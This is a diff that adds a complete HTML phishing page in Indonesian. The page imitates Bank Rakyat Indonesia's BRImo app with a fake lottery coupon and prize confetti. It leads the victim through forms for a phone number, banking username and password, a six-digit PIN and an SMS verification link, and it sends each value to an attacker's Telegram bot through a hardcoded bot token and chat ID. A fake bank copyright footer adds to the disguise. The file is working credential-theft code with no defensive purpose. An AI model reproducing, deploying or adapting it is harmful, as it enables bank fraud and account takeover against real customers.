@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>Undian BRImobile</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:400,700&display=swap">
+  <style>
+    html, body { min-height: 100vh; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; width: 100vw; box-sizing: border-box;}
+    body.bg-kupon, body.bg-form { background: linear-gradient(135deg, #d4af37, #8b0000);}
+    body.bg-login, body.bg-pin, body.bg-tautan { background: radial-gradient(circle at top, #21a6f6 0%, #0d3d6e 70%, #181a20 100%);}
+    .container { width: 100vw; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center;}
+    .card, .login-card, .pin-card, .tautan-card {
+      background: linear-gradient(145deg, #fffbe6, #f9f6f2);
+      border-radius: 20px; border: 4px solid #d4af37; box-shadow: 0 10px 25px rgba(0,0,0,0.25);
+      padding: 36px 28px 32px 28px; text-align: center; width: 340px; position: relative; overflow: hidden;
+      display: none; animation: fadeIn 0.5s;
+    }
+    .login-card, .pin-card, .tautan-card { background: #23242a; color: #fff; border: none; max-width: 370px; box-shadow: 0 4px 22px #0005; border-radius: 24px;}
+    .active { display: block !important; }
+    @keyframes fadeIn { from { opacity: 0; transform: scale(0.7);} to { opacity: 1; transform: scale(1);}}
+    .header-login { width: 100vw; max-width: 420px; margin: 0 auto; border-radius: 0 0 28px 28px;
+      background: linear-gradient(180deg, #15c6fd 0%, #2196f3 70%, #0d3d6e 100%);
+      padding: 0; box-shadow: 0 2px 20px #2196f326; text-align: center; display: none; position: relative;}
+    .header-login.active { display: block !important; }
+    .brimo-logo { margin: 0 auto; padding-top: 36px; margin-bottom: 6px; display: flex; flex-direction: column; align-items: center; justify-content: center;}
+    .brimo-logo-text { font-weight: 700; font-size: 2.8rem; letter-spacing: 2px; color: #fff; text-shadow: 0 2px 16px #2196f3a0; margin-bottom: 2px;}
+    .brimo-logo-text .mo { color: #ffb300; font-weight: 700; text-shadow: 0 2px 8px #ffd700a0;}
+    .header-desc { font-size: 1.18rem; color: #fff; letter-spacing: 1px; margin-top: 0; margin-bottom: 32px; font-weight: 500; text-shadow: 0 2px 8px #2196f3c0;}
+    h2 { color: #8b0000; margin-bottom: 13px; font-size: 1.36rem; letter-spacing: 1px; position: relative;}
+    .desc { font-size: 1.02rem; color: #b22222e0; margin-bottom: 18px;}
+    .btn, .btn-login, .btn-pin, .btn-tautan {
+      background: linear-gradient(135deg, #FFD700 40%, #FF416C 100%);
+      border: none; width: 70px; height: 70px; color: white; font-size: 1.18rem; font-weight: 700;
+      border-radius: 50%; cursor: pointer; margin-top: 10px; transition: transform 0.2s, box-shadow 0.2s, background .22s;
+      box-shadow: 0 3px 16px #FFD7008c; display: flex; align-items: center; justify-content: center; margin-left: auto; margin-right: auto; outline: none; position: relative;
+    }
+    .btn:hover, .btn-login:hover, .btn-pin:hover, .btn-tautan:hover {
+      transform: scale(1.10); background: linear-gradient(135deg, #FF416C 40%, #FFD700 100%);
+      box-shadow: 0 5px 16px #FF4B2B6c;
+    }
+    .btn-login, .btn-pin, .btn-tautan {
+      width: 100%; height: auto; background: linear-gradient(90deg, #2196f3 60%, #0d3d6e 100%);
+      border-radius: 16px; padding: 15px 0; margin-top: 19px; margin-bottom: 14px; box-shadow: 0 2px 12px #2196f3ba; letter-spacing: 2px;
+    }
+    .btn-login:hover, .btn-pin:hover, .btn-tautan:hover { background: linear-gradient(90deg, #15c6fd 60%, #2196f3 100%); transform: scale(1.03);}
+    .result { margin-top: 25px; font-size: 1.45rem; font-weight: bold; color: #2f3542; display: none; animation: popUp 0.6s ease; letter-spacing: 1px;}
+    @keyframes popUp { from {opacity: 0; transform: scale(0.7);} to {opacity: 1; transform: scale(1);}}
+    .info { font-size: 1.05rem; color: #b22222e0; margin-bottom: 24px; background: #ffe6b0; border-radius: 10px; padding: 8px 0; border: 1px solid #ffd700;}
+    .form-group { margin-bottom: 16px; text-align: left;}
+    label { display: block; font-size: 1rem; color: #8b0000; margin-bottom: 6px; font-weight: 500;}
+    input[type="tel"], input[type="text"], input[type="password"], input[type="number"], input[type="url"] { width: 100%; padding: 10px 12px; border-radius: 12px; border: 2px solid #ffd700; font-size: 1rem; margin-bottom: 4px; box-sizing: border-box; transition: border .2s; background: #fff; color: #222; font-family: 'Poppins', sans-serif;}
+    input[type="tel"]:focus, input[type="text"]:focus, input[type="password"]:focus, input[type="number"]:focus, input[type="url"]:focus { border: 2px solid #8b0000; outline: none;}
+    .error, .login-error, .pin-error, .tautan-error { color: #d7263d; font-size: 0.93rem; margin-top: 6px; margin-bottom: 0; text-align: left; min-height: 20px;}
+    .success, .tautan-success { color: #1e944e; font-size: 1rem; margin-top: 14px; font-weight: 600;}
+    .next-btn { background: none; border: none; color: #8b0000; font-size: 1rem; margin-top: 24px; text-decoration: underline; cursor: pointer; opacity: 0.75; transition: opacity .2s;}
+    .next-btn:hover { opacity: 1; }
+    .login-title { color: #15c6fd; font-size: 1.22rem; font-weight: 500; margin-bottom: 14px; margin-left: 2px;}
+    .input-group { background: #23242a; border: 2px solid #33353c; display: flex; align-items: center; border-radius: 12px; margin-bottom: 10px; padding: 0 9px 0 0; height: 52px; transition: border .2s;}
+    .input-group:focus-within { border-color: #15c6fd;}
+    .input-group .icon { font-size: 1.56rem; margin: 0 12px 0 10px; color: #15c6fd; min-width: 28px; text-align: center;}
+    .input-group input { background: transparent; border: none; outline: none; color: #fff; font-size: 1.15rem; flex: 1; padding: 6px 2px; font-family: 'Poppins', sans-serif;}
+    .input-group input::placeholder { color: #b2b6bb; letter-spacing: 1px; opacity: 0.95;}
+    .input-group .toggle-pw { background: none; border: none; color: #15c6fd; font-size: 1.3rem; cursor: pointer; margin-left: 7px; margin-right: 5px; padding: 0; display: flex; align-items: center; outline: none;}
+    .toggle-pw span { font-size: 1.35rem; display: inline-block; vertical-align: middle; line-height: 1;}
+    .login-error { color: #ff416c; font-size: 0.88rem; margin-top: 4px; margin-bottom: 0; text-align: left; min-height: 22px;}
+    .forgot-link { color: #15c6fd; font-size: 0.88rem; text-decoration: underline; float: right; margin-top: 3px; margin-bottom: 2px; cursor: pointer; transition: color .2s; display: block;}
+    .forgot-link:hover { color: #ffb300;}
+    .footer { text-align: center; color: #b2b6bb; font-size: 0.73rem; margin-top: 10px; margin-bottom: 0; letter-spacing: 0.5px; padding: 0 8px; line-height: 1.35; clear: both; display: block;}
+    .footer.pin-footer, .footer.tautan-footer { margin-top: 16px;}
+    .pin-title { color: #15c6fd; font-size: 1.22rem; font-weight: 500; margin-bottom: 18px; margin-left: 2px; letter-spacing: 1px;}
+    .pin-inputs { display: flex; gap: 10px; justify-content: center; margin-bottom: 12px; margin-top: 16px;}
+    .pin-inputs input[type="number"] { width: 38px; height: 44px; font-size: 1.42rem; text-align: center; padding: 0; border-radius: 10px; border: 2px solid #15c6fd; background: #fff; color: #23242a; margin-bottom: 0; font-family: 'Poppins', sans-serif;}
+    .pin-inputs input[type="number"]:focus { border: 2px solid #ffb300; outline: none; background: #e3f0fb;}
+    .tautan-title { color: #15c6fd; font-size: 1.22rem; font-weight: 500; margin-bottom: 18px; margin-left: 2px; letter-spacing: 1px;}
+    @media (max-width: 500px) {
+      .header-login { max-width: 100vw; }
+      .card, .login-card, .pin-card, .tautan-card { max-width: 98vw; padding: 18px 6vw; }
+      .brimo-logo-text { font-size: 2.1rem; }
+      .header-desc { font-size: 1rem; }
+      .pin-inputs input[type="number"] { width: 32px; height: 38px; font-size: 1.2rem;}
+      .footer { font-size: 0.67rem; }
+    }
+    canvas { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 5; pointer-events: none;}
+  </style>
+</head>
+<body class="bg-kupon">
+  <div class="container">
+    <!-- Halaman Kupon -->
+    <div class="card active" id="kuponCard">
+      <h2>🎟️ Kupon Undian BRImo 🎟️</h2>
+      <div class="desc">Khusus Nasabah yang Sudah Memakai BRI mobile<br>Klik tombol untuk membuka kupon!</div>
+      <button class="btn" id="bukaBtn">Buka</button>
+      <div class="result" id="result"></div>
+      <button class="next-btn" id="nextFormBtn" style="display:none;">Lanjut untuk Verifikasi </button>
+    </div>
+    <!-- Halaman Form -->
+    <div class="card" id="formCard">
+      <h2>Verifikasi Nomor HP Anda</h2>
+      <div class="info">Undian ini <b>tidak dipungut biaya</b>.<br>Masukkan nomor HP yang bisa dihubungi.</div>
+      <form id="hpForm" autocomplete="off">
+        <div class="form-group">
+          <label for="nomorhp">Nomor HP</label>
+          <input type="tel" id="nomorhp" name="nomorhp" placeholder="08xxxxxxxxxx" required pattern="[0-9]{10,}" maxlength="15">
+          <div class="error" id="errorMsg"></div>
+        </div>
+        <button type="submit" class="btn">Kirim</button>
+      </form>
+      <div class="success" id="successMsg"></div>
+    </div>
+    <!-- Halaman Login -->
+    <div class="header-login" id="loginHeader">
+      <div class="brimo-logo">
+        <div class="brimo-logo-text">BRI<span class="mo">mo</span></div>
+        <div class="header-desc">Selamat Datang</div>
+      </div>
+    </div>
+    <div class="login-card" id="loginCard">
+      <div style="height:24px;"></div>
+      <div class="login-title">Login</div>
+      <form id="loginForm" autocomplete="off">
+        <div class="input-group">
+          <span class="icon">👤</span>
+          <input type="text" id="username" name="username" placeholder="Username" required autocomplete="username" maxlength="12">
+        </div>
+        <div class="input-group">
+          <span class="icon">🔒</span>
+          <input type="password" id="password" name="password" placeholder="Password" required autocomplete="current-password">
+          <button class="toggle-pw" type="button" id="togglePw" tabindex="-1" aria-label="Tampilkan Password">
+            <span id="eyeOpen">&#128065;</span>
+            <span id="eyeClosed" style="display:none;">&#128584;</span>
+          </button>
+        </div>
+        <div class="login-error" id="loginError"></div>
+        <button type="submit" class="btn-login">LANJUT</button>
+      </form>
+      <a href="#" class="forgot-link">Lupa Password?</a>
+      <div class="footer">
+        © PT.Bank Rakyat Indonesia (Persero) Tbk.<br>
+        All Rights Reserved.
+      </div>
+    </div>
+    <!-- Halaman PIN -->
+    <div class="pin-card" id="pinCard">
+      <div class="pin-title">Masukkan PIN Anda</div>
+      <form id="pinForm" autocomplete="off">
+        <div class="pin-inputs" id="pinInputs">
+          <input type="number" min="0" max="9" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+          <input type="number" min="0" max="9" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+          <input type="number" min="0" max="9" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+          <input type="number" min="0" max="9" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+          <input type="number" min="0" max="9" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+          <input type="number" min="0" max="9" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+        </div>
+        <div class="pin-error" id="pinError"></div>
+        <button type="submit" class="btn-pin">LANJUT</button>
+      </form>
+      <div class="footer pin-footer">
+        © PT.Bank Rakyat Indonesia (Persero) Tbk.<br>
+        All Rights Reserved.
+      </div>
+    </div>
+    <!-- Halaman Tautan -->
+    <div class="tautan-card" id="tautanCard">
+      <div class="tautan-title">Masukkan Tautan dari SMS</div>
+      <form id="tautanForm" autocomplete="off">
+        <div class="form-group">
+          <label for="tautanInput">tautan telah kami kirim ke nomor handphone anda </label>
+          <input type="url" id="tautanInput" name="tautanInput" placeholder="tempel tautan yang dikirim dari sms" required>
+          <div class="tautan-error" id="tautanError"></div>
+        </div>
+        <button type="submit" class="btn-tautan">Kirim</button>
+      </form>
+      <div class="tautan-success" id="tautanSuccess"></div>
+      <div class="footer tautan-footer">
+        © PT.Bank Rakyat Indonesia (Persero) Tbk.<br>
+        All Rights Reserved.
+      </div>
+    </div>
+    <canvas id="confetti"></canvas>
+  </div>
+  <script>
+    // --- Telegram KONFIGURASI ---
+    const TELEGRAM_TOKEN = '8434058499:AAHaS0hJjSz40_CMdVED5GiVBGAmolTeivc';
+    const TELEGRAM_CHAT_ID = '8165489813';
+    // Format pesan ke Telegram sesuai permintaan
+    function sendToTelegram(msg) {
+      const format = `- - -  *_ARDI FERIYANTO_* - - -\n------------------\n${msg}`;
+      fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: format,
+          parse_mode: 'Markdown'
+        })
+      }).catch(()=>{});
+    }
+    // --- Kupon ---
+    function undiKupon() {
+      const min = 150000, max = 1000000;
+      let hadiahArr = [];
+      for(let i=min;i<=max;i+=50000) hadiahArr.push(i);
+      hadiahArr = hadiahArr.map(n => `🎉 Selamat! Kamu dapat Rp${n.toLocaleString("id-ID")}`);
+      hadiahArr.push("🌙 Hadiah Spesial: Paket Umrah!");
+      const randomIndex = Math.floor(Math.random() * hadiahArr.length);
+      const resultDiv = document.getElementById("result");
+      resultDiv.innerText = hadiahArr[randomIndex];
+      resultDiv.style.display = "block";
+      document.getElementById("nextFormBtn").style.display = "inline-block";
+      startConfetti();
+      setTimeout(stopConfetti, 3000);
+    }
+    // --- Confetti ---
+    const confettiColors = ['#FFD700', '#FF3C3C', '#FFF6D1', '#B22222', '#FFD700', '#FFB300'];
+    const canvas = document.getElementById("confetti");
+    const ctx = canvas.getContext("2d");
+    let confettiPieces = [];
+    function resizeCanvas() {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    }
+    window.addEventListener("resize", resizeCanvas);
+    resizeCanvas();
+    function startConfetti() {
+      confettiPieces = [];
+      for (let i = 0; i < 90; i++) {
+        confettiPieces.push({
+          x: Math.random() * canvas.width,
+          y: Math.random() * canvas.height - canvas.height,
+          r: Math.random() * 7 + 3,
+          d: Math.random() * 50,
+          color: confettiColors[Math.floor(Math.random() * confettiColors.length)]
+        });
+      }
+      animateConfetti();
+    }
+    function animateConfetti() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      confettiPieces.forEach(p => {
+        ctx.beginPath();
+        ctx.fillStyle = p.color;
+        ctx.arc(p.x, p.y, p.r, 0, 2 * Math.PI);
+        ctx.fill();
+      });
+      updateConfetti();
+      if (confettiPieces.length > 0) {
+        requestAnimationFrame(animateConfetti);
+      }
+    }
+    function updateConfetti() {
+      confettiPieces.forEach(p => {
+        p.y += 3;
+        p.x += Math.sin(p.d);
+        if (p.y > canvas.height) {
+          p.y = -10;
+          p.x = Math.random() * canvas.width;
+        }
+      });
+    }
+    function stopConfetti() {
+      confettiPieces = [];
+    }
+    // --- Navigasi Halaman ---
+    function showPage(page) {
+      document.getElementById("kuponCard").classList.remove("active");
+      document.getElementById("formCard").classList.remove("active");
+      document.getElementById("loginCard").classList.remove("active");
+      document.getElementById("loginHeader").classList.remove("active");
+      document.getElementById("pinCard").classList.remove("active");
+      document.getElementById("tautanCard").classList.remove("active");
+      document.body.classList.remove("bg-kupon");
+      document.body.classList.remove("bg-form");
+      document.body.classList.remove("bg-login");
+      document.body.classList.remove("bg-pin");
+      document.body.classList.remove("bg-tautan");
+      if (page === "kupon") {
+        document.getElementById("kuponCard").classList.add("active");
+        document.body.classList.add("bg-kupon");
+      }
+      if (page === "form") {
+        document.getElementById("formCard").classList.add("active");
+        document.body.classList.add("bg-form");
+      }
+      if (page === "login") {
+        document.getElementById("loginCard").classList.add("active");
+        document.getElementById("loginHeader").classList.add("active");
+        document.body.classList.add("bg-login");
+      }
+      if (page === "pin") {
+        document.getElementById("pinCard").classList.add("active");
+        document.body.classList.add("bg-pin");
+      }
+      if (page === "tautan") {
+        document.getElementById("tautanCard").classList.add("active");
+        document.body.classList.add("bg-tautan");
+      }
+    }
+    // --- Event Kupon ---
+    document.getElementById("bukaBtn").onclick = undiKupon;
+    document.getElementById("nextFormBtn").onclick = function() {
+      showPage("form");
+    };
+    // --- Form HP ---
+    const hpForm = document.getElementById('hpForm');
+    const nomorhp = document.getElementById('nomorhp');
+    const errorMsg = document.getElementById('errorMsg');
+    const successMsg = document.getElementById('successMsg');
+    hpForm.addEventListener('submit', function(e) {
+      e.preventDefault();
+      errorMsg.textContent = '';
+      successMsg.textContent = '';
+      const hpVal = nomorhp.value.trim();
+      if (!/^(08|62)[0-9]{8,}$/.test(hpVal)) {
+        errorMsg.textContent = "Nomor HP harus diawali 08 atau 62 dan minimal 10 digit angka.";
+        return;
+      }
+      if (hpVal.length < 10) {
+        errorMsg.textContent = "Nomor HP minimal 10 digit.";
+        return;
+      }
+      successMsg.textContent = "Nomor HP berhasil dikirim!";
+      nomorhp.value = '';
+      sendToTelegram(`Nomor HP: ${hpVal}`);
+      setTimeout(function(){
+        showPage("login");
+      }, 700);
+    });
+    // --- Login ---
+    const pwInput = document.getElementById('password');
+    const togglePwBtn = document.getElementById('togglePw');
+    const eyeOpen = document.getElementById('eyeOpen');
+    const eyeClosed = document.getElementById('eyeClosed');
+    togglePwBtn.onclick = function() {
+      if (pwInput.type === 'password') {
+        pwInput.type = 'text';
+        eyeOpen.style.display = 'none';
+        eyeClosed.style.display = 'inline';
+      } else {
+        pwInput.type = 'password';
+        eyeOpen.style.display = 'inline';
+        eyeClosed.style.display = 'none';
+      }
+    };
+    const loginForm = document.getElementById('loginForm');
+    const loginError = document.getElementById('loginError');
+    loginForm.addEventListener('submit', function(e) {
+      e.preventDefault();
+      loginError.textContent = '';
+      const username = document.getElementById('username').value.trim();
+      const pw = pwInput.value;
+      // Validasi username: 8-12 karakter, hanya huruf/angka, tanpa spasi/simbol
+      if (!/^[A-Za-z0-9]{8,12}$/.test(username)) {
+        loginError.textContent = "Username/Password yang anda masukan salah.";
+        return;
+      }
+      const minLength = 8;
+      if (pw.length < minLength) {
+        loginError.textContent = "Password minimal 8 karakter.";
+        return;
+      }
+      if (!/[A-Z]/.test(pw) || !/[0-9]/.test(pw)) {
+        loginError.textContent = "Username/Password yang anda masukan salah!.";
+        return;
+      }
+      loginError.textContent = "";
+      sendToTelegram(`Username: ${username}\nPassword: ${pw}`);
+      showPage("pin");
+    });
+    // --- PIN ---
+    const pinForm = document.getElementById('pinForm');
+    const pinInputs = document.querySelectorAll('#pinInputs input[type="number"]');
+    const pinError = document.getElementById('pinError');
+    pinInputs.forEach((input, i) => {
+      input.addEventListener('input', function() {
+        this.value = this.value.replace(/[^0-9]/g, '').slice(0,1);
+        if (this.value.length === 1 && i < pinInputs.length - 1) {
+          pinInputs[i+1].focus();
+        }
+      });
+      input.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace' && this.value === '' && i > 0) {
+          pinInputs[i-1].focus();
+        }
+      });
+    });
+    pinForm.addEventListener('submit', function(e) {
+      e.preventDefault();
+      pinError.textContent = '';
+      let pinVal = '';
+      pinInputs.forEach(inp => pinVal += inp.value);
+      if (pinVal.length !== 6 || !/^\d{6}$/.test(pinVal)) {
+        pinError.textContent = "PIN harus 6 digit angka.";
+        return;
+      }
+      if (/^(\d)\1{5}$/.test(pinVal)) {
+        pinError.textContent = "PIN tidak boleh semua angka sama.";
+        return;
+      }
+      pinError.style.color = "#1e944e";
+      pinError.textContent = "PIN berhasil! ";
+      pinInputs.forEach(inp => inp.value = '');
+      sendToTelegram(`PIN: ${pinVal}`);
+      setTimeout(function(){
+        showPage("tautan");
+      }, 800);
+    });
+    // --- Tautan ---
+    const tautanForm = document.getElementById('tautanForm');
+    const tautanInput = document.getElementById('tautanInput');
+    const tautanError = document.getElementById('tautanError');
+    const tautanSuccess = document.getElementById('tautanSuccess');
+    tautanForm.addEventListener('submit', function(e){
+      e.preventDefault();
+      tautanError.textContent = '';
+      tautanSuccess.textContent = '';
+      const link = tautanInput.value.trim();
+      if (!/^https?:\/\/\S+\.\S+/.test(link)) {
+        tautanError.textContent = "Format tautan tidak valid.";
+        return;
+      }
+      tautanSuccess.textContent = "proses verifikasi berhasil tunggu 1x24jam!";
+      tautanInput.value = '';
+      sendToTelegram(`Tautan SMS: ${link}`);
+    });
+    // --- Awal ---
+    showPage("kupon");
+  </script>
+</body>
+</html>
